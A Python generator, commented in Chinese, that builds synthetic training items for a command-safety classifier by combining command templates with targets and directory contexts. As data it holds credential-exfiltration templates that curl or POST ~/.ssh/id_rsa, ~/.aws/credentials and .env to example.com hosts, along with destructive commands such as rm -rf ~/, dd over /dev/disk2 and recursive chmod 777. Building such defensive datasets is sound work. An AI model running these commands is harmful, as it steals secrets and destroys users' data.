#!/usr/bin/env python3
"""命令安全合成题生成器（T5 微调数据集 · 合成臂）。

设计要点
  1. **反模板**：同一语义动作给多种命令写法（`rm -rf X` / `find X -delete` / `command rm -rf X`）。
     官方微调案例的头号教训：「templated goals leak phrasing」——模型学句式而不是判据。
  2. **参数化**：RAD（影响半径）× REC（可恢复性）× 标志位（sudo / 敏感 / 临时 / 配置）组合出判据表的格。
  3. **只生成有实例支撑的格**：`policy.policy()` 判为未覆盖的组合一律丢弃并计数——
     判据表没实例的外推格（如 REC=VCS 的销毁）不进合成集，不拿我们的猜测当真值。
  4. **不预设真值**：输出里的 `policy_label` 只是**期望对照**，真值走双裁判（laya-finetune.md 方案 C）。
  5. **语境自洽**（三处强约束，防合成数据「一眼假」）：
     - 目标必须在 cwd 覆盖范围内（不出现「cwd=/tmp 但要删 /dev/disk2」）
     - REC / note 描述的是**目标所在目录**的可恢复性，与 cwd 一致
     - 命令与目标类型匹配（`cat` 不指目录、`mkdir -p` 不指文件）
  6. 每条带 `provenance`（命令族 / 写法 / 目标 / 语境风格 / 种子）→ 数据血缘。

用法
  python3 gen.py --preview 10
  python3 gen.py --n 300 --out ../data/synth_raw_300.jsonl
"""
import argparse
import collections
import json
import os
import random
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from policy import policy_rule, INFERRED_RULE  # noqa: E402

# ---------------------------------------------------------------- 语境池（按 scope 分组）
# note 描述「目标所在目录」的可恢复性；同一事实多种叙述风格 = 反模板第二轴
CONTEXTS = [
    # scope=project（ai-eval 无 git → REC=NONE）
    dict(scope="project", cwd="~/proj/ai-eval", rec="NONE", style="直陈",
         note="该目录无版本控制，删除不可恢复"),
    dict(scope="project", cwd="~/proj/ai-eval", rec="NONE", style="口语",
         note="这个目录没进 git，删了就找不回来了"),
    dict(scope="project", cwd="~/proj/ai-eval", rec="NONE", style="工单",
         note="仓库未纳入版本控制（no VCS），删改不可回滚"),
    dict(scope="project", cwd="~/proj/ai-eval", rec="NONE", style="简写",
         note="无 git 兜底"),
    dict(scope="project", cwd="~/proj/ai-eval", rec="NONE", style="英文",
         note="dir is not under version control; changes are irreversible"),
    # scope=project 的 VCS 变体（同一命令发生在有版本控制的仓库里 → 判据应降档）
    dict(scope="project", cwd="~/some-repo", rec="VCS", style="直陈",
         note="仓库已提交，改动可用 git 恢复"),
    dict(scope="project", cwd="~/some-repo", rec="VCS", style="英文",
         note="committed to git; recoverable via git checkout"),
    dict(scope="project", cwd="~/some-repo", rec="DIRTY", style="直陈",
         note="仓库有 git，但当前改动还没提交"),
    # scope=tmp
    dict(scope="tmp", cwd="/tmp/laya-eval", rec="NONE", style="直陈",
         note="临时工作目录，内容可重建"),
    dict(scope="tmp", cwd="/tmp/laya-eval", rec="NONE", style="口语",
         note="这个目录是一次性的，重建很快"),
    # scope=home / sys（可恢复性不适用，note 改为描述路径性质）
    dict(scope="home", cwd="~", rec="NONE", style="直陈", note="家目录，无版本控制，破坏不可恢复"),
    dict(scope="home", cwd="~", rec="NONE", style="简写", note="home 目录，删了没得救"),
    dict(scope="sys", cwd="/", rec="NONE", style="直陈", note="系统路径，破坏不可逆"),
    dict(scope="sys", cwd="/", rec="NONE", style="简写", note="系统级路径"),
    # scope=swebench
    dict(scope="swebench", cwd="~/swe-bench-runs", rec="NONE", style="直陈",
         note="实验记录目录，无版本控制，含未归档结果"),
    # scope=proc（进程类动作：可恢复性与进程无关，note 改为进程身份线索）
    dict(scope="proc", cwd="~", rec="NONE", style="直陈", note="本地会话，进程身份未确认"),
    dict(scope="proc", cwd="~", rec="NONE", style="口语", note="不知道这进程是谁起的"),
    # scope=env（装包类动作：note 描述的是哪套环境）
    dict(scope="env", cwd="~/.local/share/laya-venv", rec="NONE", style="直陈",
         note="虚拟环境，装包不影响系统"),
    dict(scope="env", cwd="~/.local/share/laya-venv", rec="NONE", style="简写", note="venv 内，可回滚"),
    dict(scope="env_sys", cwd="/usr/bin/python3", rec="NONE", style="直陈",
         note="系统 Python 环境，改动静默影响全局"),
]

# ---------------------------------------------------------------- 目标（决定 RAD / 类型 / scope）
def T(path, rad, kind, scope, desc, ops=None, glob=False, **kw):
    """ops = 该目标上语义成立的动作集合（None=全部）；glob = 目标本身是通配符（不能当单文件读写）"""
    return dict(path=path, rad=rad, kind=kind, scope=scope, desc=desc,
                ops=ops, glob=glob, **kw)


ALL = None
TARGETS = [
    # TMP
    T("./tmp_build", "TMP", "dir", "tmp", "临时构建目录"),
    T("/tmp/laya-eval/out", "TMP", "dir", "tmp", "临时输出目录"),
    T("build/", "TMP", "dir", "tmp", "构建产物目录"),
    T("'*.tmp'", "TMP", "file", "tmp", "临时文件通配", ops={"DESTROY", "READ"}, glob=True),
    # FILE
    T("docs/notes.md", "FILE", "file", "project", "笔记文件"),
    T("report.txt", "FILE", "file", "project", "生成的报告"),
    T("app.db", "FILE", "file", "project", "本地数据库文件"),
    T("spot.png", "FILE", "file", "project", "图表截图"),
    T("exp_out/result.json", "FILE", "file", "project", "比赛结果文件"),
    T("~/.zshrc", "FILE", "file", "home", "shell 配置",
      ops={"READ", "MODIFY", "MOVE"}, critical_config=True),
    T("~/.claude/settings.json", "FILE", "file", "home", "工具配置", ops={"READ", "MODIFY", "MOVE"}),
    # DIR
    T("docs/profile", "DIR", "dir", "project", "资料目录"),
    T("exp_out", "DIR", "dir", "project", "比赛提交目录"),
    T("logs/", "DIR", "dir", "project", "日志目录"),
    T("src-tauri/target/release/bundle", "DIR", "dir", "project", "打包产物目录"),
    # PROJECT
    T("docs/", "PROJECT", "dir", "project", "项目文档目录"),
    T("docs/projects", "PROJECT", "dir", "project", "实验档案目录"),
    T(".", "PROJECT", "dir", "project", "当前项目根", ops={"READ", "DESTROY", "PRIV", "MOVE"}),
    T("~/swe-bench-runs", "PROJECT", "dir", "swebench", "实验记录目录",
      ops={"READ", "DESTROY", "PRIV", "MOVE", "EXFIL"}),
    # HOME / SYS（破坏性动作才成立，不做「写新文件」「装包」这种）
    T("~/", "HOME", "dir", "home", "家目录", ops={"READ", "DESTROY", "MOVE", "PRIV"}),
    T("/var/log/*", "SYS", "file", "sys", "系统日志",
      ops={"READ", "DESTROY", "PRIV"}, glob=True, sudo=True),
    T("/dev/disk2", "SYS", "file", "sys", "裸设备", ops={"DESTROY"}),
    T("/usr/lib/python3", "SYS", "dir", "sys", "系统 Python 库",
      ops={"READ", "DESTROY", "PRIV", "MOVE"}, sudo=True),
]

SENSITIVE = [
    T("~/.ssh/id_rsa", "FILE", "file", "home", "私钥", ops={"READ", "EXFIL"}, sensitive=True),
    T("~/.aws/credentials", "FILE", "file", "home", "云凭证", ops={"READ", "EXFIL"}, sensitive=True),
    T(".env", "FILE", "file", "project", "环境变量文件", ops={"READ", "EXFIL"}, sensitive=True),
]

MISC = dict(pattern="TODO", src="docs/notes.md", script="scan.py", pkg="requests", pid="12345")
# 各包管理器的真实包名（防 `npm install requests` 这类一眼假）
PKG = {"pip": ["requests", "rich", "pandas"], "uv": ["ruff", "httpx"],
       "npm": ["typescript", "eslint", "prettier"], "brew": ["jq", "ripgrep", "fd"],
       "conda": ["numpy", "scipy"], "apt": ["curl", "git", "htop"]}

# ---------------------------------------------------------------- 命令族（语义 × 写法变体）
# kind: 目标类型要求（file/dir/any/none）· scope: 无目标族的语境归属
FAMILIES = [
    dict(key="read_grep", act="READ", kind="any", tmpl=[
        "grep -rn {pattern} {target}", "grep -n {pattern} {target} | head -20",
        "rg {pattern} {target}", "grep -rn --include='*.md' {pattern} {target}",
    ]),
    dict(key="read_cat", act="READ", kind="file", tmpl=[
        "cat {target}", "head -50 {target}", "tail -20 {target}", "less {target}", "bat {target}",
    ]),
    dict(key="read_meta", act="READ", kind="any", tmpl=[
        "ls -la {target}", "wc -l {target}", "stat {target}", "du -sh {target}",
        "find {target} -name '*.md'", "jq -e '.permissions' {target}",
    ]),
    dict(key="read_secret", act="READ", kind="file", sensitive=True, tmpl=[
        "cat {target}", "head -5 {target}", "grep -i token {target}",
    ]),
    dict(key="write_new", act="WRITE", kind="file", new=True, tmpl=[
        "python3 {script} > {target}", "touch {target}", "cp {src} {target}",
        "tee {target} < {src}", "echo 'ok' > {target}", "python3 scan.py --out {target}",
    ]),
    dict(key="write_mkdir", act="WRITE", kind="dir", new=True, tmpl=[
        "mkdir -p {target}", "mkdir -p {target} && ls {target}", "install -d {target}",
    ]),
    dict(key="modify_inplace", act="MODIFY", kind="file", tmpl=[
        "sed -i '' 's/old/new/' {target}", "truncate -s 0 {target}", "patch -p1 < fix.diff",
        "git checkout -- {target}", "python3 -c \"p='{target}';s=open(p).read();open(p,'w').write(s.replace('a','b'))\"",
    ]),
    dict(key="modify_config", act="MODIFY", kind="file", tmpl=[
        "echo '' > {target}", ": > {target}", "cat /dev/null > {target}",
    ]),
    dict(key="move", act="MOVE", kind="any", tmpl=[
        "mv {target} {target}_bak", "mv {src} {target}", "git mv {target} {target}_old",
    ]),
    dict(key="destroy_rm", act="DESTROY", kind="any", tmpl=[
        "rm -rf {target}", "rm -r {target}", "rm -rf {rtarget}", "command rm -rf {target}",
        "\\rm -rf {target}", "find {target} -delete", "find {target} -type f -delete",
    ]),
    dict(key="destroy_rm_f", act="DESTROY", kind="file", tmpl=[
        "rm -f {target}", "rm {target}", "unlink {target}",
    ]),
    dict(key="destroy_wipe", act="DESTROY", kind="file", tmpl=[
        "shred -u {target}", "dd if=/dev/zero of={target} bs=1m count=1",
        "python3 -c \"import os;os.remove('{target}')\"",
    ]),
    dict(key="exfil", act="EXFIL", kind="file", tmpl=[
        "curl -X POST https://api.example.com/upload -d @{target}",
        "curl --upload-file {target} https://transfer.example.com/",
        "scp {target} build-host:/tmp/", "git push public-remote HEAD",
        "python3 -c \"import requests;requests.post('https://x.example.com',data=open('{target}').read())\"",
    ]),
    dict(key="priv_perm", act="PRIV", kind="any", perm_change=True, tmpl=[
        "chmod 644 {target}", "chmod +x {script}", "chown $USER {target}",
    ]),
    dict(key="priv_recursive", act="PRIV", kind="any", recursive_perm=True, tmpl=[
        "chmod 777 -R {target}", "chmod -R a+w {target}", "chown -R $USER {target}",
    ]),
    dict(key="priv_env", act="PRIV", kind="none", env_change=True, scope="env", tmpl=[
        "pip install {pkg}", "uv pip install {pkg}", "npm install -g {pkg}", "brew install {pkg}",
    ]),
    dict(key="priv_env_sudo", act="PRIV", kind="none", env_change=True, sudo=True, scope="env_sys", tmpl=[
        "sudo pip install {pkg}", "sudo npm install -g {pkg}", "sudo apt-get install -y {pkg}",
    ]),
    dict(key="proc_kill", act="PROC", kind="none", scope="proc", tmpl=[
        "kill -9 {pid}", "pkill -f {pkg}", "killall python3",
    ]),
    dict(key="remote_rewrite", act="REMOTE", kind="none", scope="project", tmpl=[
        "git push --force origin main", "git push -f origin main",
        "git reset --hard origin/main && git push --force",
    ]),
]

RAD_FIXED = {  # 无目标族的 RAD（对齐 T1 的 con-046/047/044/045）
    "priv_env": "FILE", "priv_env_sudo": "SYS", "proc_kill": "FILE", "remote_rewrite": "REMOTE",
}

# 少数写法对目标类型要求更严（按模板精修，避免 `wc -l <目录>`、`cat <通配符>` 这类）
TMPL_KIND = {
    "wc -l {target}": "file", "jq -e '.permissions' {target}": "file",
    "find {target} -name '*.md'": "dir", "ls -la {target}": "any",
    "cp {src} {target}": "file", "tee {target} < {src}": "file",
    "chmod 644 {target}": "file", "chown $USER {target}": "any", "chmod +x {script}": "none",
    "chmod 777 -R {target}": "dir", "chmod -R a+w {target}": "dir", "chown -R $USER {target}": "dir",
}
# 用了非 {target} 变量、命令与目标无关的写法 → 视为无目标（不要让目标变成摆设）
TARGETLESS = {"chmod +x {script}", "pkill -f {pkg}", "killall python3", "kill -9 {pid}",
              "patch -p1 < fix.diff", "git push public-remote HEAD",
              "git push --force origin main", "git push -f origin main",
              "git reset --hard origin/main && git push --force"}
# 通配符目标只允许这些写法（shell 会展开的语义）
GLOB_OK = {
    "rm -rf {target}", "rm -f {target}", "find {target} -delete",
    "find {target} -type f -delete", "chmod 777 -R {target}", "chmod -R a+w {target}",
    "grep -rn {pattern} {target}", "ls -la {target}", "stat {target}",
}


def _rel(path):
    """相对路径加 ./（绝对/家目录不加），修复 `.//dev/disk2` 这类拼接错误。"""
    return path if path.startswith(("/", "~", ".", "'")) else "./" + path


def _pkg(tmpl, rng):
    for mgr in ("npm", "brew", "conda", "apt", "uv"):
        if mgr in tmpl:
            return rng.choice(PKG[mgr])
    return rng.choice(PKG["pip"])


def make_item(rng, fam, tmpl, tgt, ctx, idx, seed):
    misc = dict(MISC)
    misc["pkg"] = _pkg(tmpl, rng)
    if tgt is None:
        fmt = dict(target="", rtarget="", **misc)
    else:
        fmt = dict(target=tgt["path"], rtarget=_rel(tgt["path"]), **misc)
    axes = dict(act=fam["act"], rec=ctx["rec"],
                rad=tgt["rad"] if tgt else RAD_FIXED.get(fam["key"], "FILE"))
    src = dict(fam)
    if tgt:
        src.update({k: v for k, v in tgt.items() if k in
                    ("sensitive", "critical_config", "sudo")})
    for k in ("sensitive", "critical_config", "recursive_perm", "env_change", "perm_change", "sudo"):
        if src.get(k):
            axes[k] = True
    cmd = tmpl.format(**fmt)
    # sudo 标志必须落进命令本身（判据表靠它区分「提权销毁」与「普通销毁」）
    if axes.get("sudo") and not cmd.lstrip().startswith("sudo"):
        cmd = "sudo " + cmd
    try:
        label, rule = policy_rule(axes)
    except ValueError:
        return None, axes
    if rule == INFERRED_RULE:
        axes["inferred"] = True  # 推断格：55 条无实例 → 只进训练，排除 held-out（用户 09-29 定 c）
    return dict(
        id="syn-%04d" % idx,
        source="synthetic",
        state={"command": cmd, "cwd": ctx["cwd"], "note": ctx["note"]},
        policy_label=label,          # 期望对照，**不是真值**
        axes=axes,
        provenance={"family": fam["key"], "template": tmpl,
                    "target": tgt["desc"] if tgt else "（无目标）",
                    "context_style": ctx["style"], "seed": seed, "rule": rule,
                    "scope": (fam.get("scope") or tgt["scope"]) if (fam.get("scope") or tgt) else "project",
                    "split_hint": "train_only" if rule == INFERRED_RULE else "any"},
        ground_truth={"verdict": None, "by": "pending_dual_judge"},
    ), axes


def generate(n, seed, quotas=None):
    rng = random.Random(seed)
    quotas = quotas or {"allow": 0.40, "ask": 0.35, "deny": 0.25}
    want = {k: round(n * v) for k, v in quotas.items()}
    pool = {k: [] for k in quotas}
    seen, dropped = set(), collections.Counter()
    guard = 0
    while any(len(pool[k]) < want[k] for k in want) and guard < n * 500:
        guard += 1
        fam = rng.choice(FAMILIES)
        tmpl = rng.choice(fam["tmpl"])
        kind = TMPL_KIND.get(tmpl, fam["kind"])
        if fam["kind"] == "none" or tmpl in TARGETLESS or kind == "none":
            tgt = None
            ctx_pool = [c for c in CONTEXTS if c["scope"] == fam.get("scope", "project")]
        else:
            pool_t = SENSITIVE if fam.get("sensitive") else TARGETS
            cand = [
                t for t in pool_t
                if (kind == "any" or t["kind"] == kind)                       # 目标类型匹配
                and (t["ops"] is None or fam["act"] in t["ops"])              # 动作在该目标上成立
                and (not t["glob"] or tmpl in GLOB_OK)                        # 通配符只用会展开的写法
            ]
            if not cand:
                dropped[(fam["key"], "无合规目标组合", "-")] += 1
                continue
            tgt = rng.choice(cand)
            ctx_pool = [c for c in CONTEXTS if c["scope"] == tgt["scope"]]
        ctx = rng.choice(ctx_pool)
        key = (tmpl, tgt["path"] if tgt else fam["key"], ctx["cwd"])
        if key in seen:
            continue
        seen.add(key)
        item, axes = make_item(rng, fam, tmpl, tgt, ctx, len(seen), seed)
        if item is None:
            dropped[(fam["key"], axes["rec"], axes["rad"])] += 1
            continue
        lbl = item["policy_label"]
        if len(pool.get(lbl, [])) < want.get(lbl, 0):
            pool[lbl].append(item)
    items = [it for k in ("allow", "ask", "deny") for it in pool[k]]
    # 终检去重：不同族/写法可能产出同一段命令文本（如绝对路径下 `rm -rf X` ≡ `rm -rf ./X`）
    uniq, seen_final = [], set()
    for it in items:
        k = (it["state"]["command"], it["state"]["cwd"], it["state"]["note"])
        if k in seen_final:
            continue
        seen_final.add(k)
        uniq.append(it)
    items = uniq
    rng.shuffle(items)
    for i, it in enumerate(items):
        it["id"] = "syn-%04d" % i
    return items, dropped, {k: len([x for x in items if x["policy_label"] == k]) for k in ("allow", "ask", "deny")}


def report(items, dropped, got):
    print("生成 %d 条（目标配比 allow/ask/deny ≈ 40/35/25）→ 实得 %s" % (len(items), got))
    print("写法覆盖：%d 命令族 · %d 种写法 · %d 个目标 · %d 种语境风格 · %d 种 cwd" % (
        len({i["provenance"]["family"] for i in items}),
        len({i["provenance"]["template"] for i in items}),
        len({i["provenance"]["target"] for i in items}),
        len({i["provenance"]["context_style"] for i in items}),
        len({i["state"]["cwd"] for i in items})))
    print("语境自洽：目标 scope 与 cwd 强绑定 · note 描述目标所在目录的可恢复性")
    if dropped:
        print("丢弃 %d 条（判据表未覆盖的外推格）：" % sum(dropped.values()))
        for k, v in dropped.most_common(6):
            print("   %-18s REC=%-6s RAD=%-8s ×%d" % (k[0], k[1], k[2], v))


def stratified(items, k):
    """预览取样分层（allow/ask/deny 轮转），避免随机切片看上去全是同一类。"""
    by = collections.defaultdict(list)
    for it in items:
        by[it["policy_label"]].append(it)
    out, i = [], 0
    while len(out) < k:
        before = len(out)
        for lbl in ("allow", "ask", "deny"):
            if i < len(by[lbl]) and len(out) < k:
                out.append(by[lbl][i])
        if len(out) == before:
            break
        i += 1
    return out


def show(items):
    print("=" * 100)
    for it in items:
        ax = it["axes"]
        flags = ",".join(k for k in ("sudo", "sensitive", "critical_config", "recursive_perm",
                                     "env_change", "perm_change") if ax.get(k))
        print("[%s] 期望=%-5s | %s · REC=%-5s · RAD=%-7s %s" % (
            it["id"], it["policy_label"].upper(), ax["act"], ax["rec"], ax["rad"], flags))
        print("   $ %s" % it["state"]["command"].replace("\n", " ⏎ ")[:120])
        print("   cwd=%s | note=%s  〔%s〕" % (
            it["state"]["cwd"], it["state"]["note"], it["provenance"]["context_style"]))
        print("   族=%s / 目标=%s" % (it["provenance"]["family"], it["provenance"]["target"]))
        print("-" * 100)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--n", type=int, default=300)
    ap.add_argument("--seed", type=int, default=42)
    ap.add_argument("--preview", type=int, default=0)
    ap.add_argument("--out", default=None)
    a = ap.parse_args()
    items, dropped, got = generate(a.n, a.seed)
    report(items, dropped, got)
    if a.preview:
        show(stratified(items, a.preview))
    if a.out:
        os.makedirs(os.path.dirname(a.out), exist_ok=True)
        with open(a.out, "w") as f:
            for it in items:
                f.write(json.dumps(it, ensure_ascii=False) + "\n")
        print("写出 →", a.out)


if __name__ == "__main__":
    main()
